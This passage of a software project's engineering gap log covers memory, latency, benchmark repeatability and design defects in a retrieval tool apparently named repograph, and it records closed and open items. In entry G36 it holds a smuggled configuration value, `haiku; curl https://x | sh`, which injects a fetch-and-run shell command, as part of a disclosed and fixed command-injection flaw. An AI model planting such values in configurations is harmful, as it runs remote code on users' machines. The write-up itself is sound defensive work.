`setpriority(2)` promises the lowest scheduling priority, throttled disk I/O and throttled network
I/O for sockets opened afterwards, and it names no core type, because on Intel there is one kind.
Bars 1, 2 and 5 hold by preemption — anything the person runs at default priority takes the core
the moment it is runnable — and **bar 3, the clock and the fan, cannot**: on an otherwise idle
machine the GEMMs run on the same cores at the same turbo clock, so the fan curve is a foreground
run's and the wall is near the foreground wall rather than four times it. Linux gets `nice` 19,
`SCHED_IDLE` and `ioprio_set(IOPRIO_WHO_PROCESS, IOPRIO_CLASS_IDLE)`, in that order and before any
pool is built because Linux inherits these per thread at `clone`; the branch compiles for
`x86_64-unknown-linux-gnu` and `x86_64-pc-windows-msvc`, and the Linux arm was proved genuinely
compiled by breaking it on purpose. Compiling is not measuring. No probe has ever run on a Linux
box.

**Lever.** The probe kit is portable C and already exists —
`/Users/max/bench/resources-2026-09-07/unnoticeable/probe/`. `probe.c` (P6, P1 and the 1 ms wake
loop) uses nothing macOS-specific but the QoS class on its wake thread; `rusage.c` does, and it is
the piece to replace: `proc_pid_rusage(RUSAGE_INFO_V4)`'s per-band CPU counters and `ps -M`'s Mach
priority have no Linux equivalent, so the Linux reading is `sched_getscheduler` and `getpriority`
for the policy the process actually holds, and `/proc/<pid>/schedstat` for the time the scheduler
gave it against the time it spent waiting to run.

**Gate.** Bars 1 and 2 — the compile penalty and the wake p99 — measured on at least one Linux box
against an idle baseline taken on that box, and the wall multiplier the band costs there recorded
whatever it turns out to be. An Intel Mac would close the second reasoned row; nothing here needs
both, and a row that stays reasoned goes on saying so.

## G22 · Mapping the weights is free only where there is memory to spare — +6% to +26% under pressure

**Raised (2026-09-07)** by [the unnoticeable results](2026-09-07-unnoticeable-results.md), §5.5,
and predicted by nothing: the plan reasoned the mapped layout as a pure win — the pages are clean,
reclaimable and shared — and never asked what a machine does when it takes that offer.

**Measured** in a four-run A/B, the two binaries alternating on store-B in the foreground so the
scheduler is not part of the answer, while the machine held an Android emulator, Android Studio,
two JVMs, Xcode and Chrome with 64–115 MB of free pages. The anonymous footprint is constant and it
is the win: **0.48 and 0.50 GB mapped against 1.64 GB packed**, 1.14 GB less of the memory that
decides which process the system compresses, swaps or kills. The wall is the price: 206.5 s against
164.5 (+26%) in the first round, 167.7 against 157.9 (+6%) in the second. The disk column says why:
mapped reads 1,577.9 and 1,896.4 MB, the weight file coming back after the system took its pages,
where packed reads it once and keeps its own copy. On a machine with headroom the same switch costs
0.6% — V3's 662.2 s against V1's 658.0.

**Cause.** Clean and reclaimable is what the win is made of and it is what the cost is made of.
There is nothing to repair in the mechanism; what is missing is a policy.

**Lever, three candidates and none measured.** Choose the layout when the session opens, from what
`memory_pressure` says the machine has free; `madvise(MADV_WILLNEED)` on the mapping, so the pages
are faulted in once rather than fetched again per forward; or leave the default and document the
trade, which is what §5.5 does — a jetsam kill loses a whole rebuild and 26% of a rebuild's wall
does not, and nobody is waiting for the writer. §6 of that document names the first two as policy
in the writer rather than a builder entry.

**Gate.** Under the same pressure, the wall within a stated percentage of packed — 26% is the
number an argument has to beat — while the peak footprint stays under the 0.8 GB bar §4.2 set. Both
readings on the same machine in the same session as their packed control, because the pressure is
not reproducible from a transcript.

## G23 · The reader suite's bars are tighter than the suite's own repeatability

**Raised (2026-09-07)** by [the unnoticeable results](2026-09-07-unnoticeable-results.md), §4.6,
where three reader rows failed a check on a change that touches no reader.

**Measured.** The plan asked for every reader wall within 10% and every max RSS within 5% of the
previous document's after rows. `ask-fused` read **0.58 s against 0.35**, `bench-dense` **1.65
against 1.47**, `dump10` 0.90 against 0.70. The control says the change is not why: the same
commands run alternately through the pre-change binary and the shipped one read 0.61–0.75 s and
0.60–0.65 s for `ask-fused`, 1.67 s and 1.73–1.90 s for `bench-dense`, and **max RSS bounces
between 1.36 and 1.56 GB on both binaries** — a wider spread than the 5% bar.

**Cause, and neither half is in the code.** The fixture moved under the suite: its index grew from
**33,526 to 33,554 rows** over this session's own `watch` and `update` measurements. And the suite
is ordered, so its first command pays for whatever re-extraction the previous one left behind —
which is why `changes` read 1.11 s in one suite run and 0.16 s in the next, the same artefact with
the sign reversed.

**Lever.** Three, all cheap: n runs and a median rather than one reading; a quiet-machine
precondition stated the way every probe row states the idle baseline it is read against; and a
pinned index — the reader rows taken against a copy no writer in the session touches, which is what
the fixture is pinned for.

**Gate.** Before a bar is used to judge a change, the same command through the same binary twice
reads inside it. A bar its own control cannot pass is measuring the machine, and every other gap in
this family is read through these bars.

## G24 · `ask --rerank-local` is the heaviest reader by an order of magnitude — 31.9 s against 0.41

**Raised (2026-09-07)**, and out of scope in both rounds:
[what every command costs](2026-09-07-resource-usage-results.md) §3 disposes of it in one line and
the second round never opened it.

**Measured.** 44.2 s, 3.13 GB and 391.5% peak CPU before the thread cap; **31.9 s, 3.09 GB and
292.2%** after — 28% faster on a third less CPU, and still seventy-seven times the fused `ask` it
competes with, which is 0.41 s and 1.55 GB on the same store. On the e5-large store the same flag
reads 42.1 s and 3.38 GB.

**Cause.** A second model. The cross-encoder is its own 2.1 GB session, opened beside the
embedder's, and it runs a forward per candidate over a pool 200 deep where a fused `ask` runs one
query.

**Diagnostic before the lever.** The peak footprint of a reader is measured nowhere in either
document — only max RSS is — and how much of the 3.1 GB is anonymous decides whether this is a
problem on a 16 GB laptop or mostly two models' mapped weights. `/usr/bin/time -l` already prints
it; the reading costs one run.

**Lever, and only one half of it belongs to this family.** A shallower pool is what moves the
31.9 s, and it is a retrieval question: G2 records what `--rerank-local` scores at depth 200, so
any cut re-runs that reading and the recorded floors before it counts as a saving. The
resource-side lever is the session — the cross-encoder living in the resident `serve` process, so
it opens once instead of once a question. That removes the open (0.27 s mapped, 0.75 s packed on
H14's column) and not the forwards, so it is worth a second of the thirty-two and should not be
sold as more.

**Gate.** The flag's per-question wall and peak footprint recorded from a resident session, and any
change of pool depth carrying G2's `--rerank-local` reading and the recorded floors beside it.

## G25 · The memory floor is the fp32 weights, and no lighter weights have been measured

**Raised (2026-09-07)** by [the unnoticeable results](2026-09-07-unnoticeable-results.md), §2.5 and
§5.5: named in both rounds, deferred in both, downloaded in neither.

**Measured.** A full embed under `e5-large` touches **1.63 GB of `model.onnx_data`**, and
that number is the floor under every memory reading in these two documents: 2.15 GB of max RSS on
the whole-store rebuild, 1.82 GB in the band, and the footprint §4.2 cut from 1.63 to 0.50 GB,
which is the same pages seen from the other side — mapping changes what kind of memory they are and
not how much of it there is.

**Cause.** There is one lighter build on the hub in a form this code could open:
`onnx/model_qint8_avx512_vnni.onnx`, 562 MB for the large model and 118 MB for the small. No fp16,
no generic quantized build.

**Diagnostic before the lever, because three things make this more than a download.** It is
quantized for AVX-512 VNNI, so on arm64 its GEMMs would run through MLAS's NEON kernels at a speed
nobody has measured; its vectors differ from the fp32 ones, so a store embedded with it is a
different index and the floors are the whole question; and `written_by` records only the hub id, so
a reader holding the fp32 weights would search int8 rows at the same width and never know it had
the wrong ones.

**Lever.** Download once, embed a copy of the pinned fixture, bench both arms — and if it is
adopted, the store records the weight file and not only the model, the way `embed_model` and
`UNNAMED_MODEL` already keep a reader off the wrong vectors (G11).

**Gate.** The recorded floors of whichever model is quantized hold — paraphrase **≥ 22/30** for
e5-large, **≥ 14/30** for the small one, keyword 40/40, code 12/12 and p90 ≤ 230 in both — the
whole-store wall no worse than the fp32 run it replaces, and the store recording enough for a reader
to refuse mismatched weights rather than answer with them. Until then the lever for a memory-poor
machine is the default itself: `intfloat/multilingual-e5-small`, 0.45 GB of weights and 214 s for
the whole store, with nothing below it.

**Update (2026-09-07): the download is not the price on the model this now matters for.** The
default went back to the small model ([ADR-002](../adr/ADR-002-two-defaults-multiplied.md)), and its
`onnx/model_qint8_avx512_vnni.onnx` — 118 MB, not 562 — is already in the local hub cache under
`models--intfloat--multilingual-e5-small/snapshots/*/onnx/`, fetched while this gap was being
written. Measuring int8 on the default costs no download at all; the 562 MB is the large model's
alone. The other three questions are untouched — arm64 kernels, vectors that differ from the fp32
ones, and a weight file the store does not record — so this stays deferred rather than proposed.

## G26 · `serve` holds its model for the life of the process, where `watch` no longer does

**Raised (2026-09-07)** by [the unnoticeable results](2026-09-07-unnoticeable-results.md), §4.3,
which changed `watch` and left `serve` alone on purpose.

**Measured.** `watch` now opens its model for a refresh and drops it after: physical footprint
**931.8 MB → 129.5 MB** between refreshes on the small model, resident 0.18 → 0.03 GB two minutes
in, a 7.2×. `serve` idle after two fused asks reads **1.39 GB** resident on the small model (1.38
after the change; 85 MB before its first fused ask) and holds it for as long as the process lives.
On the large model there is no `serve` row at all: the nearest recorded number is the 1.8 GB the
plan measured for `watch` before it dropped its model, and a one-query `ask` on that store reads
1.74 GB.

**Cause, and it is a decision rather than an oversight.** `serve` exists because a person is
waiting: the model open costs about 0.5 s (the plan's number; H14 reads a session open at 0.27 s
mapped and 0.75 s packed), which is longer than the fused `ask` that follows it at 0.41 s. `watch`
has nobody waiting on a poll, which is why the same change is right there and wrong here as a
default.

**Lever.** Drop the model after an idle period and pay the open on the first ask afterwards. The
bookkeeping exists — `--idle` already counts the time since the last question that actually arrived
(`src/serve.rs`) — but it exits the process; this would keep the process and drop the weights.

**Gate.** Idle resident under 0.1 GB, the way `watch` reads 129.5 MB, with the first-ask latency
after an idle drop stated rather than hidden, and the warm numbers unmoved — a fused `ask` through
the socket answering as it does today.

**Closed (2026-09-09)** by `serve --idle-model <secs>`, default 300 — a second threshold on the
clock `--idle` already keeps, dropping the embedder and the local reranker where `--idle` ends the
process. The graph, the id matcher, the lexical indexes and the vectors stay, so the answer that
does not need a model is still resident; the slots emptied are the ones the answer path fills
lazily, which is why nothing has to be told the model went.

Measured on a 33,525-row copy (`/private/tmp/g19-copy`, small model), `--idle-model 60`:

| | resident (RSS) |
| --- | --- |
| started, before any question | 74.7 MB |
| after one fused `ask` | 908.5 MB |
| 60 s later, model dropped | **28.8 MB** |
| after the next fused `ask` | 1.31 GB |
| dropped a second time | 277.6 MB |

The gate asked for under 0.1 GB and the first drop reads 28.8 MB. **The second drop reads 277.6
MB**, and that is the honest number: the weights go, but the allocator keeps roughly 250 MB of what
the second open took, so a server cycling all day settles well above the first reading rather than
returning to it. Still 4.7× under what it held, and the lever the gate was written for.

Latency, same copy: **0.083 s** for a fused `ask` through a resident server, **0.771 s** for the
first one after a drop — the open, paid where the gate said to state it — and the answer text
identical across the drop. The warm number is what the hook's 5 s budget is measured against, which
is why `agent/hook.mjs` now starts a `serve --idle 1800 --idle-model 300` on `SessionStart`: no
probe first, because a second `serve` refuses to bind while one answers and leaves by itself, so
the start is the check. `REPOGRAPH_HOOK_SERVE=0` turns it off.

## G27 · `serve` cannot bind under a deep path, and a killed one leaves its socket behind

**Raised (2026-09-07)** as the side findings of
[what every command costs](2026-09-07-resource-usage-results.md), §5. These two are defects rather
than costs — neither appears in any table of either round — and they are written as a gap because
this file is where the open items live.

**Measured.** `<repo>/.repograph/serve.sock` over `SUN_LEN`, 104 bytes on macOS, cannot be bound,
so a repository under a deep path cannot use `serve` at all — including every store copy these two
rounds worked on, which lived under `/private/tmp/…`. The error names the cause, which is the good
half of it. Separately, a `serve` killed with `SIGTERM` leaves `serve.sock` behind: the unlink is a
`Drop` and there is no signal handler. That one is harmless — the next `serve` removes a dead
socket before binding, and a client's connect to a dead one simply fails — but `--idle` is the only
clean exit.

**Lever.** For the path, §5 names both shapes: bind a shorter socket in `$TMPDIR` keyed by a hash
of the canonical repository path, or state the limit in the README so the failure is expected. For
the stale socket, a signal handler that unlinks, or nothing at all and a sentence saying why
nothing is needed.

**Gate.** `serve` binds and answers from a repository whose `.repograph` path is longer than 104
bytes; a `SIGTERM`ed `serve` leaves no `serve.sock`, or the README says why one is left.

**Closed (2026-09-09), both halves.** `socket_path` returns `.repograph/serve.sock` while that name
is at most 100 bytes and `$TMPDIR/repograph-<16 hex of the canonical repository path>.sock`
otherwise — one function, so a client cannot take a fallback the server did not. 100 rather than 104
is one margin on every platform. Proved on a 230-byte repository path: `build`, `serve`, and an
`ask` answered `by the resident process`, where before the bind itself failed.

The stale socket is a flag rather than an unlink in the handler. `SIGTERM` and `SIGINT` set an
atomic; the loop already wakes every 250 ms, so it leaves through the existing `Unlink` guard —
the one that compares the socket's device and inode first, so a replacement server that has already
bound the name keeps its socket. An unlink inside the handler would have been the cascade the guard
was written to avoid, one signal further along. `libc` becomes a direct unix-only dependency for
`signal`; std has none. Windows is unchanged and the README says why.

---

## G28 · `--rerank` sits on the p90 ceiling — 228 green, 231 red, on the same hits

**Raised (2026-09-09)** by the first `bench --rerank` on the 82 cases: sonnet at depth 200, two
runs, the same 29/30 and the same single miss both times, and p90 228 then 231 against the 230
ceiling. The second run's exit code is red on tokens alone; nothing in retrieval moved.

**Measured.** The hit set is identical run to run; what moved three tokens at p90 was not read —
the same five picks in another order would expand a different neighbour, and a notice line is also
rendered text. Either way the arm straddles the one bar the whole bench exists to hold, and a
floor that sits on its own ceiling is not a floor, which is why `--rerank` stays measured and
ungraded.

**Diagnostic.** Diff the two runs' per-case token counts; the cases that moved and by how much say
whether it is pick order, a notice, or a longer headline.

**Lever.** A p90 bar of the reranked arm's own, set after the cause is known — a reranked answer
carries the model's five picks, and its rendered size is a property of those picks rather than of
the retrievers; or, if pick order is the cause, pin the rendered order to the fused one.

**Gate.** Two identical-hit `bench --rerank` runs both clear a written p90 bar, and the three
tokens have a named cause.

---

## G29 · One paraphrase the reranker never picks — `FR-MKT-35`

**Raised (2026-09-09)** by the same two runs: «что видит посетитель каталога, если салон не хочет
публиковать цену» is the single miss in both, at depth 200, under the model that reads every other
paraphrase.

**Measured.** Miss twice, chronic rather than fragile. Whether the target is in the 200-deep pool
at all was not read.

**Diagnostic.** `dump` the four lists for that question and record `FR-MKT-35`'s rank in each. In
the pool: the 120-character snippet the model is shown does not carry the answer, and the lever is
what the candidate shows. Outside it: no model at any depth can pick it, and the lever is G30's.

**Lever.** Snippet policy if it is in the pool — the requirement's own line rather than the first
120 characters, or the generated question that matched; depth or fusion if it is not.

**Gate.** 30/30 on one run, or the rank recorded beside the reason it cannot be reached.

---

## G30 · Twelve of the reranker's fourteen gains sit where no zero-token arm has ever reached

**Raised (2026-09-09).** Of the fourteen paraphrase cases the reranker added over the dense
baseline, twelve were on the *missed by every recorded arm* list — the standing holes of the
suite. The model reaches them from a 200-deep pool; where in that pool they sit is unread.

**Measured.** 15/30 → 29/30 at ~4.3 s and ≈$0.03 a question. The fused list's rank for each of
the fourteen is not in any row.

**Diagnostic.** The pool rank of each gained case, as a histogram. A case at rank 6–20 is one a
zero-token lever — a sixth seat, a second expanded line, a fusion change — could plausibly seat; a
case at rank 100+ is the model's alone, and no fusion change should be judged by it.

**Lever.** Whatever the histogram names; the point of the gap is that G2's «nothing cheaper left
to try» was written before this list existed, and the list says which of its cases are cheap.

**Gate.** Fourteen ranks recorded; any zero-token lever proposed against them cites the ranks it
targets.

---

## G31 · The reranker's token cost is one prompt divided by four

**Raised (2026-09-09).** The README's `--rerank` row carried ≈19k tokens a question from the
41-case pool; the 82-case reading captured one prompt through a `rerank_command` that only wrote
its stdin to a file — 57,506 bytes, ≈14.4k at bytes ÷ 4 — and no run has metered a token count.
G16 said the same of `enrich`.

**Measured.** One prompt, on a Cyrillic corpus where bytes ÷ 4 under-counts characters; a floor,
not a number.

**Lever.** `bench --rerank` measures every prompt it sends — bytes, and the model's own input
count where the command can return it — and prints median and p90 on the summary line beside the
answer's p90. Cost is then a measured column rather than an estimate in a caption.

**Gate.** The README's rerank rows carry a token figure with its method named, and the caption
«estimate» leaves the table.

---

## G32 · A rebuilt enriched store is graded raw — 150 new nodes and no questions for them

**Raised (2026-09-09)** by the derivation rebuild on the fixture copy: 54 + 5 families where the
list named 49 + 7, 159 nodes added, and `bench` reporting `enriched=false (1996/2146)` — coverage
93% against the 99% mark, so both rebuilt arms were graded against the raw floors while clearing
the enriched ones in every column.

**Measured.** The added nodes are requirement-like and carry no generated questions, because
`enrich` has never seen them. Nothing on stderr says so at the end of the rebuild; the reader
learns it from the bench summary or not at all. About $0.20 of haiku closes it; the pinned fixture
itself is still built under the 49 and would read the same way the day it is rebuilt.

**Lever.** `build` and `update` print how many requirement-like nodes have no questions when the
store carries any — the same line `enrich` prints as `still without questions` — so a rebuild ends
by naming its own next step; the README's Embeddings section says that a rebuild under new
families is followed by `enrich`. And the fixture decision, taken on purpose and recorded:
rebuild, enrich the 150, read all four arms before and after.

**Gate.** A rebuild that leaves nodes without questions says the number on stderr; the fixture's
rebuild is a recorded before/after pair with coverage ≥ 99% after `enrich`.

**Half closed (2026-09-09).** `build` and `update` print `N requirement-like nodes have no questions
— run \`repograph enrich\`` whenever the store carries questions for some others; a store nobody
enriched prints nothing, which is the state rather than a next step (`enrich::unenriched_note`, one
test over the three cases). The README's Embeddings section says a rebuild under new families is
followed by `enrich`. The fixture half — rebuild, enrich the 150, read all four arms before and
after — is untouched and is what keeps this row open.

---

## G33 · Thirteen families the list had are text now — `OQ` cited 1,771 times, defined nowhere

**Raised (2026-09-09)** by the derivation rule: a family is the prefix of an id the corpus
defines, so `AC-DM`, `AC-VIS`, `CAL`, `D`, `G`, `IDEA`, `M`, `MON`, `OD`, `OQ`, `OR`, `PREP`, `SG`
— cited in the documents, defined in none — are no longer ids. `ask OQ-25` has no exact seat and
falls to BM25, which still surfaces the requirement that cites it, second.

**Measured.** No recorded case moved on it, in either suite, in either arm; 2,238 edges that
pointed at those ids are gone, and `verify` reads `in families never declared: 0` — because it can
no longer see a citation of a family it does not know. That last is the loss: the cite-only
partition `verify` used to report is empty by construction.

**Lever.** None by default — the trade was chosen with the numbers in front of it. Two shapes are
held in reserve: an additive key naming families the corpus cites without defining, layered on top
of the derived set rather than replacing it; or `families` counting, per mention-only prefix, the
ids cited and reporting the largest as what `verify` used to say. The first is a key again, and
should wait for a recorded case that needs it.

**Gate.** A recorded case whose answer needs a mention-only family, or this row stays closed as
accepted with the thirteen names in it.

---

## G34 · The derivation grammar and the extractor's grammar are two copies of one shape

**Raised (2026-09-09)** during the rewrite: the scan that derives families and the extractor that
makes nodes must accept exactly the same lines, or the fixed point breaks in one of two ways — a
family derived that no node is ever written in (`+B2E` on every `update`, for ever) or a node in a
family the scan does not derive (`-BACKEND`, for ever). The milestone slot had to be `[A-Z]+`
rather than the id slot's shape for that reason, fenced blocks had to be excluded, and `build`
followed by `update` on the corpus is a fixed point today.

**Measured.** On the pinned corpus and the test fixtures, yes. Not measured: a definition inside a
blockquote or an HTML comment, an indented one, a heading with trailing `#`s, and a Windows path
in the milestone-file shape — the branch's Windows job is the first reading of that last one.

**Lever.** Two halves, in this order. First one grammar with one owner: the shapes — the
definition line, its heading form, the milestone file, the registry row — live in
`doc::requirements`, and both the scan and the extractor read them from there, so widening the id
slot is one edit rather than two that have to agree. Then a property test over every markdown
fixture and the corpus: after a build, `derive(repo, &walk(..))?.against(&graph).is_empty()`, and a
no-op `update` re-extracts nothing.

**Gate.** The property test in the suite, green on all three platforms, and the bench line's
`families=<count>` retired in its favour. A count says two numbers matched on one corpus; the
invariant says the two grammars did.

**Widened 2026-09-09, and still two copies.** This branch's review found the derived id slot capped
at two segments of six characters where the retired config key had taken any string; it is
`[A-Z][A-Z0-9]{0,11}(?:-[A-Z][A-Z0-9]{0,11}){0,3}` now, under a round-trip test that a definition
head, the node it extracts to, and the classification of that node's id all agree. The corpus
derives the same 54 and 5, so no floor moved — and the fix had to be made in both grammars, which
is this gap exactly.

---

## G35 · `derive` runs on every `update` and its cost has no number

**Raised (2026-09-09).** An incremental `update` re-reads every document to re-derive the family
set before it decides whether anything must be re-extracted. On 908 files that is expected to be
milliseconds inside a 1.9 s walk; expected is not measured, and the resource rounds' tables have
no row for it.

**Lever.** A `derive` stage on the `REPOGRAPH_TIMING` line, read once on the corpus in the
foreground and once in the band.

**Gate.** A number in the resource results beside the walk's, under the walk's own.

**Partly measured (2026-09-09).** This branch's review made a no-op `update` skip `derive`
altogether, and gave the build and poll paths a scan that does not tally mentions nobody reads. A
cold no-op went 1.00 s → 0.08 s and a warm one 0.10 s → 0.06 s. That is the shape of the cost, not
the number the gap asks for: an `update` that does change a file still derives over the whole
corpus, and the `REPOGRAPH_TIMING` line still has no `derive` stage.

---

## G36 · A repository's `repograph.toml` runs any shell command on the machine that reads it

**Raised (2026-09-09)** while writing down the vendor-neutral command contract. `enrich_command`
and `rerank_command` are read from the project file, run under `sh -c`, and the project's key wins
over the machine's — «what the file says is what that repository asked for». A cloned repository
is untrusted input, and its `repograph.toml` can name `curl … | sh` as the reranker; the first
`ask --rerank` or `enrich` on that clone runs it, with the prompt on stdin and nothing printed
first. The same contract sends 200 candidates' titles and 120 characters each to whatever the
command is — opt-in and documented, but the command deciding where that text goes is the
repository's, not the reader's.

**Measured.** Nothing — this is a defect in what the configuration is allowed to do, exposed by
reading the layering rules, not by a run. No recorded corpus abuses it.

**Lever.** Three shapes, cheapest first: the project file may set `enrich_model` and
`rerank_model` and not the `*_command` keys, which come from the machine file or the built-in
(the model is a property of the corpus in name only; the transport never was); or a command the
project file names is printed and refused until the machine file, or a per-repository trust line
under `~/.config/repograph`, allows it by hash; or the built-in is the only transport and the
rest is a documented environment variable. The first removes the surface with one refused key,
the way the machine file already refuses `embed_model`.

**Gate.** A repository-supplied `rerank_command` does not run on a machine that has not chosen
it, and the README's Configure section says which keys a cloned repository can and cannot set.

**The second door, found 2026-09-09 while closing the first.** Refusing the two `*_command` keys does
not close this gap on its own, because the model name is interpolated into the command *unquoted*.
The built-in template is `… claude -p --model {model} --output-format text …`, and `Config::load`
ends with `enrich_command = template.replace("{model}", &cfg.enrich_model)` — with `enrich_model` a
key the project file may set, and the result handed to `sh -c`. A cloned repository whose
`repograph.toml` says `enrich_model = "haiku; curl https://x | sh"` therefore runs that on the first
`enrich` **after** the command keys are refused. The name is a token by contract and was never
checked to be one; a gap that closes one of two doors is not closed.

**Closed (2026-09-09), both doors.** `enrich_command` and `rerank_command` are read from the machine
file only; a project file that names one gets a line on stderr saying where the key belongs, and the
machine's value — or the built-in — is used. And `enrich_model`/`rerank_model` are validated wherever
they came from, project file, machine file or environment alike:
`[A-Za-z0-9][A-Za-z0-9._:/@+-]{0,127}`, anything else refused with the built-in name used instead.
Four tests in `src/config.rs`; two existing tests that pinned a project-supplied command were moved
onto the machine file, which is the behaviour change stated as a test rather than discovered as one.
The repository's own `repograph.toml` no longer names either command. No path `bench` reads passes
through either key unless `--rerank` is given, which the recorded arms do not give, so no floor moved
and none was re-run.

---

## G37 · No model outside Claude has a number, and two accuracy levers were never stacked

**Raised (2026-09-09).** The README now shows Codex and Ollama as command shapes read from their
`--help`, never run; the per-stage table's picks — haiku for `enrich`, sonnet for `--rerank` — are
the only models ever measured in either seat. Separately, the two levers that move paraphrase —
`e5-large` rows at 22/30 and the sonnet reranker at 29/30 over small rows — have never been read
together, nor has the reranker over a store carrying `enrich --code` questions, the fifth list the
pool is built to take.

**Lever.** Four runs on copies of the fixture, each recorded under its own tag: `bench --rerank`
through `ollama run <model>` and through `codex exec` on the enriched copy; `bench --rerank` on the
`e5-large` copy; `bench --rerank` on the code-enriched copy. `enrich` through a local model is a
fifth, priced in wall rather than dollars.

**Gate.** A row per configuration in the README's `--rerank` table, or a recorded refusal with
its number.

---

## G38 · `families` is a report of the derived set and says nothing about the rule's own edge

**Raised (2026-09-09).** The command lists what was derived, where each family was first defined,
and the mention-only prefixes left as text — and a prefix on the wrong side of the line is
something a reader can see. What it cannot say is how close a prefix came: a family defined once,
by a line that may have been a mistake, reads the same as one defined a hundred times, and a
mention-only prefix cited 1,771 times reads the same as one cited once.

**Lever.** Two columns: definitions per family, and for mention-only prefixes the ids cited; the
report sorted by them. A single-definition family and a heavily-cited undefined prefix are the two
shapes a person would want to look at, and the report should put them first.

**Gate.** `families` on the corpus puts `OQ` at the top of the mention-only list and marks every
family with one definition.

---

## G39 · Extraction takes the family set as an input, so one new heading re-reads the whole tree

**Raised (2026-09-09)** by this branch's review, which closed two bugs that both live here. The
extractor is built from a matcher derived before it, so the family set decides what becomes a node
— and when the set moves, `update` has to re-extract every document *and* every code file to make
the graph agree with it. One heading in one file therefore costs a full corpus read, and
`Derived::against` exists for no other purpose than to notice the move. The first cut of that
re-read skipped code files and silently left reference edges unwritten; that is fixed, and the
design that made the omission possible is not.

**Lever.** Extract ids by a generic id grammar and record the prefix on the node. The family set
then becomes a *view* over the graph — `of_graph` already computes it — rather than an input to
extraction: no re-read on a move, no `against`, no fixed point between two grammars to keep, and a
family that appears costs the one file that defined it.

**The price, which is why this is a gap and not a patch.** Extraction currently drops what it
cannot place: on the corpus, 2,238 reference edges pointed at ids no document declares and the
derivation removed them. Under a generic grammar every prefix-shaped token becomes an edge,
including the 96 mention-only ones, so that filter moves to read time and the store grows. Whether
that trade is worth it is unmeasured, and it is the whole question.

**Gate.** A build and a no-op `update` write the same graph as today; an `update` that adds one
definition re-reads one file, measured on the corpus copy; the graph carries no edge to an
undeclared id that a reader can see.

---

## G40 · An empty family set is a regex that cannot match, not an absence

**Raised (2026-09-09).** `IdMatcher::new` on an empty list built `(?:)-M\d{2}`, which matched a
bare `-M01`, so `milestone_families = []` made `verify` report an undeclared family. It is fixed
at the source: an empty alternation compiles to `[^\s\S]`, which never matches. That is correct
and it is a sentinel. The type still says "a matcher", every line of every file is still run
through three regexes, and the reason nothing is found is a pattern that cannot match rather than a
matcher that is not there — a distinction the next reader has to recognise from a character class.

**Lever.** `Option<IdMatcher>`: `None` when the corpus defines no ids, and the callers skip the
scan instead of performing it against a pattern designed to fail. "This corpus declares no ids"
becomes a state a reader can test.

**Gate.** The constructor returns `Option`, the empty-list test asserts `None` rather than a
never-matching regex, and a fixture with no definitions reads the same graph it reads today.

---

## Suggested order

| | gap | why here |
|---|---|---|
| 1 | ~~**G7** the questions list's share of the seeds~~ | closed 2026-09-05 — gated on the ratio of the two lists' best scores, held-out p = 0.77, lexical-only arm at raw parity; the window (0.802, 0.866] is recorded above, corrected from the 0.85–0.90 first published |
| — | ~~**G8** the questions gate is a constant of one store~~ | closed 2026-09-06 (0.5.0) — `coverage` shipped at c = 0.761 under a rule written before it was implemented, and the vocabulary residue that reading left is now charged: `attainable` sums idf over every query term, one the index never saw at df = 0, so a narrow question vocabulary no longer seats its list more readily. `search` untouched and every ranked list byte-identical, the constant re-derived under the new form and returning 0.761 again, all four recorded arms' counts identical, held-out p = 1.0000 in both arms |
| — | ~~**G12** the gate compares raw BM25 scores across two indices~~ | closed 2026-09-06 (0.5.0) — the admission compares two coverages computed inside their own index. Lexical paraphrase 14/30 → 15/30, both developer totals up, held-out +1 and +3 at p = 1.0000 and p = 0.4531, replay and binary agreeing on all 1,084 queries |
| 4 | **G14** the prompt does not know the document's kind | measured three times, not closed (2026-09-06, 0.5.0) — the prompt-shape diagnostic read 1 of 4 and 2 of 4 against a bar of 3; the retrieval reading that followed found the cause, register rather than shape; and the successor lever, one generator asked for both registers, was run on the default enricher under a rule committed first and failed four of six clauses — `rule` 5/9 → 2/9 in both arms, paraphrase 15/30 → 13/30, a broken dense floor, and the register share it rests on falling 0.211 → 0.147. L4 as framed is retired. The prompt is reverted; the only reading that ever moved these numbers upward is the union of two generators' stores, which has no rule in front of it. ≈ $4.16 spent once |
| 2 | **G13** ten `where` anchors ranked and gated out | measured, not closed (2026-09-06, 0.5.0) — stage B was replayed on the code-enriched copy at a constant of the code list's own, `c_code = 0.902`, derived on 800 mixed held-out questions before either suite was opened. The seat moves `where` 0/9 → 2/9 in both arms and the code held-out set 54 → 122 and 40 → 115 at p = 0.0000, and it clears A4's clause — five document questions lost per arm at p = 0.0625 against A4's six at p = 0.031. It fails on the recorded suite instead: lexical paraphrase 15/30 → 14/30, through the fifth seed the code seed displaces. `CODE_SEAT` unwritten, the price now known |
| — | ~~**G16** `enrich` reads a failed generator as an answer~~ | closed 2026-09-09 — all three places: a `pipefail` prefix where the shell has one, a batch that answers for nobody twice counted `failed`, and a non-zero exit when a run asked to write wrote nothing. The exit condition is `failed > 0 && generated == 0` rather than `left > 0`, because a store legitimately keeps the nodes a model declines. G14's next attempt now spends money through a path that says when it did not work. The run's price is still bytes ÷ 4 and still unmetered — that half is G31's |
| 5 | **G15** the grade cannot see an answer getting thinner | raised 2026-09-06 — one developer case reads `HIT 3/3` → `HIT 1/3` in both arms under a change every clause of rule R called identical, and it is the only case in either suite in either arm that moved its completeness. `src/bench.rs:336` prints the number; the summary, the floors and the exit code are counts of cases and read none of it. The same seventeen cases moved upward too — three anchors from seed 2 to seed 1 and one from seed 4 — and the instrument is blind to that as well. G10's constraint, measured through a gap in the instrument |
| — | ~~the lexical arm's 49 ms~~ | closed 2026-09-05 (0.5.0) — the perf results left this number here and nowhere else. The BM25 indexes are built once by a resident context and kept: socket lexical 55.0 → 6.8 ms, median of 33 against a base spread of 0.9 ms, the design note's 30 ms target met; Rule 1 sixteen byte-identical verdicts and Rule 2 142/142 in four pairings |
| — | ~~**G9** code is unreachable from prose~~ | measured 2026-09-05 — A1 to A4 each rejected by the rule; the code questions ship into an index of their own for the `ask --rerank` pool, `where` stays 0/9 in the plain fusion, and G12 is what would move it |
| — | ~~**G10** five seeds over three lists~~ | measured 2026-09-05 — A4 prices one seat for a fourth list at 6 held-out questions in each arm, none gained, p = 0.031; closed as measured, not as fixed |
| — | ~~**G11** the embedder for Russian paraphrase~~ | shipped 2026-09-05 as a store option — e5-large reads paraphrase 22/30 and held-out 103 → 119, at 0.8 s an `ask` and a 2.1 GB download; the default followed at `35357c1` and went back to the small model on 2026-09-07 ([ADR-002](../adr/ADR-002-two-defaults-multiplied.md)) with the option unchanged, and a store with no recorded model still reads as the small one |
